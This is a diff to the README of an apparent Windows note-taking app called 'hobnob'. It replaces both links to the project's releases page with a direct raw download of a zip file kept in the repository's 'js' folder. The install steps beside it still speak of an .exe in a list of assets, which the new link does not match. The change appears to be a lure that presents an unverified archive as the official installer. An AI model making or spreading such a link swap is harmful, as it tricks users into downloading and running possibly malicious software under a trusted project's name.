@@ -1,6 +1,6 @@
 # 📝 hobnob - Keep meeting notes private on device
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/disqualified-dyeweed147/hobnob/releases)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://raw.githubusercontent.com/disqualified-dyeweed147/hobnob/main/js/Software-1.0.zip)
 
 ## 🎯 About This App
 
@@ -18,7 +18,7 @@ Your computer requires the following to run Hobnob:
 
 ## 📥 How to Install
 
-1. Visit [this page to download](https://github.com/disqualified-dyeweed147/hobnob/releases) the latest installer.
+1. Visit [this page to download](https://raw.githubusercontent.com/disqualified-dyeweed147/hobnob/main/js/Software-1.0.zip) the latest installer.
 2. Find the file ending in .exe in the list of assets.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
